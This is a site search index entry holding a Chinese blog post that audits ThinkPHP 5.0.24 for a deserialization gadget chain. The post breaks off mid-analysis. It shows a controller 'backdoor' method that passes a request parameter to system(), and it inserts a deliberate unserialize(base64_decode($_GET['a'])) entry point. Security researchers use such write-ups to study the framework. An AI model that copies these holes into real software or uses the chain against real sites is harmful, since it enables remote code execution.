<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ThinkPHP-5.0.x代码审计</title>
      <link href="/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-0-X代码审计："><a href="#ThinkPHP-5-0-X代码审计：" class="headerlink" title="ThinkPHP 5.0.X代码审计："></a>ThinkPHP 5.0.X代码审计：</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>本次记录主要是对ThinkPHP 框架的 5.0.x版本进行代码审计，主要涉及的软件有：</p><blockquote><p>PHPSTORM</p><p>Seay源代码审计系统</p><p>Phpstudy_pro</p><p>PHP版本使用7.3.4</p></blockquote><p>关于PHPSTORM的Xdebug的搭建，我主要参考了<a href="https://www.bilibili.com/video/BV1Ri4y1m7AZ/?spm_id_from=333.788&vd_source=12a4f922a214b16d9f4d1f3565210b8b">暗月的教程</a></p><p>（说实话phpstudy_pro的配置文件真的太麻烦了）</p><p><a href="http://www.thinkphp.cn/donate/download/id/1279.html">ThinkPHP 5.0.24 链接</a></p><h2 id="Seay自动审计："><a href="#Seay自动审计：" class="headerlink" title="Seay自动审计："></a>Seay自动审计：</h2><p>首先还是常规操作，使用Seay源代码审计系统来进行自动审计：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220809164053433.png" alt="image-20220809164053433"></p><p>这边出了一堆。不过不是每个都有用的。</p><p>主要还是要审计POP链，然后RCE。</p><h2 id="目录结构："><a href="#目录结构：" class="headerlink" title="目录结构："></a>目录结构：</h2><p>首先是对ThinkPHP 5.0目录结构进行查看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www  WEB部署目录（或者子目录）</span><br><span class="line">├─application           应用目录</span><br><span class="line">│  ├─common             公共模块目录（可以更改）</span><br><span class="line">│  ├─module_name        模块目录</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录</span><br><span class="line">│  │  ├─view            视图目录</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─command.php        命令行工具配置文件</span><br><span class="line">│  ├─common.php         公共函数文件</span><br><span class="line">│  ├─config.php         公共配置文件</span><br><span class="line">│  ├─route.php          路由配置文件</span><br><span class="line">│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">│  └─database.php       数据库配置文件</span><br><span class="line">│</span><br><span class="line">├─public                WEB目录（对外访问目录）</span><br><span class="line">│  ├─index.php          入口文件</span><br><span class="line">│  ├─router.php         快速测试文件</span><br><span class="line">│  └─.htaccess          用于apache的重写</span><br><span class="line">│</span><br><span class="line">├─thinkphp              框架系统目录</span><br><span class="line">│  ├─lang               语言文件目录</span><br><span class="line">│  ├─library            框架类库目录</span><br><span class="line">│  │  ├─think           Think类库包目录</span><br><span class="line">│  │  └─traits          系统Trait目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─tpl                系统模板目录</span><br><span class="line">│  ├─base.php           基础定义文件</span><br><span class="line">│  ├─console.php        控制台入口文件</span><br><span class="line">│  ├─convention.php     框架惯例配置文件</span><br><span class="line">│  ├─helper.php         助手函数文件</span><br><span class="line">│  ├─phpunit.xml        phpunit配置文件</span><br><span class="line">│  └─start.php          框架入口文件</span><br><span class="line">│</span><br><span class="line">├─extend                扩展类库目录</span><br><span class="line">├─runtime               应用的运行时目录（可写，可定制）</span><br><span class="line">├─vendor                第三方类库目录（Composer依赖库）</span><br><span class="line">├─build.php             自动生成定义文件（参考）</span><br><span class="line">├─composer.json         composer 定义文件</span><br><span class="line">├─LICENSE.txt           授权说明文件</span><br><span class="line">├─README.md             README 文件</span><br><span class="line">├─think                 命令行入口文件</span><br></pre></td></tr></table></figure><p>这部分可以比较明确的看见每个部分代码的作用是什么，方便到时候思考，或者是跟链子。</p><h2 id="构建利用点："><a href="#构建利用点：" class="headerlink" title="构建利用点："></a>构建利用点：</h2><p><strong>关于控制器文件(Controller):</strong></p><p>ThinkPHP的控制器是一个类，接收用户的输入并调用模型和视图去完成用户的需求，控制器层由核心控制器和业务控制器组成，核心控制器由系统内部的App类完成，负责应用（包括模块、控制器和操作）的调度控制，包括HTTP请求拦截和转发、加载配置等。业务控制器则由用户定义的控制器类完成。多层业务控制器的实现原理和模型的分层类似，例如业务控制器和事件控制器。</p><p><strong>控制器写法：</strong></p><p>控制器文件通常放在<code>application/module/controller</code>下面，类名和文件名保持大小写一致，并采用驼峰命名（首字母大写）。</p><p>一个典型的控制器类定义如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控制器类文件的实际位置是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">application\index\controller\Index.php</span><br></pre></td></tr></table></figure><p>一个例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"><span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想进入后门，需要访问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/index.php/Index/backdoor/?command=ls</span><br></pre></td></tr></table></figure><p>像上面这样就可以实现命令执行。</p><p>这个框架是需要<strong>二次开发</strong>，并且实现反序列化才能够进行利用，<strong>所以需要手写一个利用点。</strong>就写在controller里。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome thinkphp 5.0.24&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])); <span class="comment">//下面部分是自带的。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/think&gt;&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="利用链分析："><a href="#利用链分析：" class="headerlink" title="利用链分析："></a>利用链分析：</h2><p>对于PHP反序列化来说，一般来说，比较常见的起点是：</p><blockquote><p>_wakeup()  反序列化后，自动被调用</p><p>_destruct() 对象被销毁前，被调用</p><p>_toString()  对象被当作字符串输出前，被调用</p></blockquote><p>比较常见的中间跳板是：</p><blockquote><p>__toString 当一个对象被当做字符串使用，自动被调用</p><p>__get 读取不可访问或不存在属性时被调用</p><p>__set 当给不可访问或不存在属性赋值时被调用</p><p>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</p><p>形如 $this-&gt;$func();</p></blockquote><p>根据以上两个经验，首先在Seay中进行全局查找。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810164113231.png" alt="image-20220810164113231"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810164130266.png" alt="image-20220810164130266"></p><p>那么可能存在的POP链大概率就在这部分。</p><h2 id="尝试审计："><a href="#尝试审计：" class="headerlink" title="尝试审计："></a>尝试审计：</h2><p>尝试审计第一个<code>__wakeup()</code></p><p>实际上来说<code>__wakeup()</code>因为是在进行了反序列化之后才进行的，所以大部分时候是对反序列化内容的限制，很少作为入口，大部分时候可以直接看<code>__destruct()</code></p><p>但是这里还是看一下</p><p>从Seay里可以看见，这部分的反序列化函数在：<br><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810165159038.png" alt="image-20220810165159038"></p><p>首先看一下<code>unserialize()</code>中的值是否可控。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810171741240.png" alt="image-20220810171741240"></p><p>向上看一下<code>$value</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810173114362.png" alt="image-20220810173114362"></p><p>这里可以看见value的值被设置为了null。</p><p>后面陆续向下看，可以发现的是$value值在这部分被用来存储时间戳<img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810200145426.png" alt="image-20220810200145426"></p><p>然后在接下来的<code>writeTransform()</code>函数部分进行使用者需要的数据类型的更改。</p><p>然后在<code>readTransform()</code>部分进行数据类型的变回去（进行了json格式加码，就进行解码，进行了序列化的就反序列化）</p><p>因此很容易发现<code>$value</code>的值是我们不能操控的，所以这里无法利用。</p><h2 id="POP链："><a href="#POP链：" class="headerlink" title="POP链："></a>POP链：</h2><p>有了以上的经验，接下来我们对<code>__destruct()</code>函数进行审计。</p><p>路径：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/process/pipes/Windows.php</span><br></pre></td></tr></table></figure><p>这里首先看一下<code>__destruct()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810201437296.png" alt="image-20220810201437296"></p><p>可以看见这边调用了两个函数，跟进一下。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810201548871.png" alt="image-20220810201548871"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810201608641.png" alt="image-20220810201608641"> </p><p>首先分析一下<code>close()</code>成员方法。</p><p>可以看到这里首先是调用了父类中的<code>close()</code>方法，这里跟进一下，可以找到父类<code>Pipes</code>中的<code>close()</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810202655543.png" alt="image-20220810202655543"></p><p>这里的作用就是将<code>pipes</code>数组中存在的文件一一关闭，最后再将<code>pipes</code>数组清空。</p><p>子类中的方法同理，可知<code>close()</code>用于关闭文件，虽然可以控制传参，但是不能进一步利用。</p><p>分析<code>removeFiles()</code>成员方法。</p><p>可以看见这里有一个敏感函数，<code>file_exists()</code>。当执行该函数的时候，会将参数作为字符串来判断，如果输入的是参数是一个对象，可以触发<code>__toString()</code>魔术方法</p><p>看一下<code>$filename</code>能不能控制。</p><p>这里看一下<code>$this-&gt;files</code>的用法，写入值在<code>__construct()</code>，不影响，因为反序列化不会调用<code>__construct()</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810223824350.png" alt="image-20220810223824350"></p><p>可以在<code>__construct()</code>看见files数组中，进行定义的过程。</p><p>这里使用到了<code>tempnam()</code>函数，可以再指定的目录中创建一个具有唯一文件名的临时文件。成功返回新的文件名，失败返回false。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220811155604058.png" alt="image-20220811155604058"></p><p>另一个函数返回当前操作系统的临时文件目录。</p><p>这部分可以看见数组<code>$file</code>的定义，发现是可以控制的。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220811203810750.png" alt="image-20220811203810750"></p><p>跟进到<code>__toString()</code>，在Seay代码审计系统中进行全局搜索：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220811204906271.png" alt="image-20220811204906271"></p><p>这里经过尝试之后，可以直接跟进到<code>Model.php</code>中的<code>__toString()</code>参数。**(注意Model是一个抽象类，要进行了继承了之后才能实例化成对象，所以要找一个子类，这里可以选择Pivot)**</p><p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20220812142053975.png" alt="image-20220812142053975"></p><p>跟进到<code>toJson()</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812142139952.png" alt="image-20220812142139952"></p><p>这里使用了<code>json_encode()</code>函数，函数返回一个字符串，包含了value值json格式的表示。编码会受到options参数的印象。</p><p>跟进到<code>toArray()</code>方法。（太长了，不放截图）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 转换当前模型对象为数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>    = [];</span><br><span class="line">        <span class="variable">$visible</span> = [];</span><br><span class="line">        <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 过滤属性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;visible)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_diff_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">reset</span>(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">                <span class="comment">// 关联模型数据集</span></span><br><span class="line">                <span class="variable">$arr</span> = [];</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 模型属性</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                        <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                        <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                                <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                    <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里比较长，但是不需要进行特别详细的审计，主要是看看有没有可以利用的危险函数，或者是可以当成跳板的利用点。</p><p>简单看了一下，这里没有什么危险函数，所以要考虑找跳板。</p><p>这里比较常见的跳板主要是<code>__call()</code></p><p>看看有没有可控的，调用了函数的变量。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812143808226.png" alt="image-20220812143808226"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812172140357.png" alt="image-20220812172140357"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812143843351.png" alt="image-20220812143843351"></p><p>可以看到，一共有这三个变量调用了方法，找一下有没有可控的。</p><p><strong>利用PHPSTORM的查找写入值，可以比较方便的看见写入和读取的过程。</strong></p><h3 id="前提"><a href="#前提" class="headerlink" title="前提:"></a>前提:</h3><h4 id="首先看-relation"><a href="#首先看-relation" class="headerlink" title="首先看$relation"></a>首先看<code>$relation</code></h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812145720654.png" alt="image-20220812145720654"></p><p>前两个是用getAttr()函数来返回以$key为键名的数组$data的元素值。</p><p>后一个是调用了Loader类中的方法，看一下方法：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812153658721.png" alt="image-20220812153658721"></p><p>函数备注了字符串命名风格转换，理论上来说对于输入的字符串<code>$name</code>是不会有什么影响的，如果<code>$name</code>可以进行控制的话，那么就可以控制到<code>$relation</code>。</p><p>回头查看一下：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812154015673.png" alt="image-20220812154015673"></p><p>通过查看<code>append</code>的调用，可以发现<code>append</code>是可以控制的，那么<code>$name</code>和<code>$relation</code>就是可以控制的了。可以通过这里触发<code>__call()</code>魔术方法。</p><h4 id="然后是看-modelRelation"><a href="#然后是看-modelRelation" class="headerlink" title="然后是看$modelRelation"></a>然后是看<code>$modelRelation</code></h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812150206858.png" alt="image-20220812150206858"></p><p>这里有一个写入值的地方。</p><p>说实话，这部分我没看懂代码</p><p>查了一下之后， 对于这部分代码可以理解为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>(); <span class="comment">//relation是一个可以改变的函数名，可以根据$relatioin不同值，来使得$modelRelation等于不同函数的返回值。</span></span><br></pre></td></tr></table></figure><p>同时要进入这部分，需要首先满足<code>method_exists()</code>这个方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812163408257.png" alt="image-20220812163408257"></p><p>用于这部分，就是需要满足<code>$relation()</code>所指向的方法，是存在于Model类中的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812163650728.png" alt="image-20220812163650728"></p><p>这里选择的是getError()这个方法，因为返回值是可以控制的。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812163810108.png" alt="image-20220812163810108"></p><p>所以只要通过设置<code>$error</code>为一个对象，同时将<code>$relation</code>设置为getError,就可以实现对<code>$modelRelation</code>的控制，进而触发<code>__call()</code></p><h4 id="最后看一下-value"><a href="#最后看一下-value" class="headerlink" title="最后看一下$value"></a>最后看一下<code>$value</code></h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812164332703.png" alt="image-20220812164332703"></p><p>这里可以看见两个写入值的地方，跟进一下<code>getRelationData($modelRelation)</code></p><p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20220813230308173.png" 